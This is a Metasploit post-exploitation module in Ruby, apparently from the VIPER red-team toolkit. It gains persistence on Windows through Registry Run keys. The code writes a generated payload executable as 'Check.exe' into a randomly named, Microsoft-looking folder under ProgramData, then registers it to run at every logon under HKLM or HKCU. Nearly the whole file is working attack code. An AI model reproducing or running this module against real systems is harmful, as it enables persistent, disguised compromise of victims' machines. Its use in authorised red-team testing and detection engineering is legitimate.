##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Registry Run Keys (T1060)- VIPER',
                      'Description'   => %q{
                          Persistence:
                          Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account's associated permissions level.},
                      'License'       => MSF_LICENSE,
                      'Author'        => ['Praetorian'],
                      'References'    => [['URL', 'https://attack.mitre.org/wiki/Technique/T1037']],
                      'Platform'      => ['win'],
                      'Targets'       => [['Windows', {}]],
                      'SessionTypes'  => ['meterpreter'],
                      'DefaultTarget' => 0,
          ))
    register_options(
            [
                    OptString.new('REMOTE_EXE_PATH', [false, 'The remote victim exe path to run. Use temp directory as default. ']),
            ])
  end

  def exploit

    unless session.type == "meterpreter"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)
      return
    end

    vprint_status("Running module against #{sysinfo['Computer']}")

    @storedir = create_store_rand_dir()
    if @storedir == nil
      pub_json_result(false,
                      'Create rand dir failed',
                      nil,
                      self.uuid)
      return
    end
    exe      = generate_payload_exe
    exe_path = @storedir + "\\" + "Check.exe"
    write_file_to_target(exe_path, exe)

    unless session.fs.file.exist? exe_path
      pub_json_result(false,
                      'write loader to storedir failed,maybe permission or AV',
                      nil,
                      self.uuid)
      return
    end
    if is_admin?
      reg_base_key = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    else
      reg_base_key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    end

    reg_base_val = "[]"
    unless registry_key_exist? reg_base_key
      unless registry_createkey(reg_base_key)
        pub_json_result(false,
                        'crete registry failed',
                        nil,
                        self.uuid)
      end
    end
    # add the logon script
    if registry_setvaldata(reg_base_key, reg_base_val, "\"#{exe_path}\"", "REG_SZ")
      vprint_good("Success! To test persistence, log out and then log in.")
      pub_json_result(true,
                      nil,
                      exe_path,
                      self.uuid)
      return
    else
      pub_json_result(false,
                      'write registry failed',
                      nil,
                      self.uuid)
    end

  end

  def create_store_rand_dir()
    dirname     = Rex::Text.rand_text_alpha(6)
    fulldirname = session.sys.config.getenv('ProgramData') + "\\" + "Microsoft_#{dirname}"
    session.fs.dir.mkdir(fulldirname)
    if session.fs.file.exist? fulldirname
      vprint_good("create storedir : #{fulldirname}")
      return fulldirname
    else
      vprint_error("create storedir failed : #{fulldirname}")
      return nil
    end
  end

  def write_file_to_target(filepath, filedata)
    fd = session.fs.file.new(filepath, "wb")
    fd.write(filedata)
    fd.close
  end
end
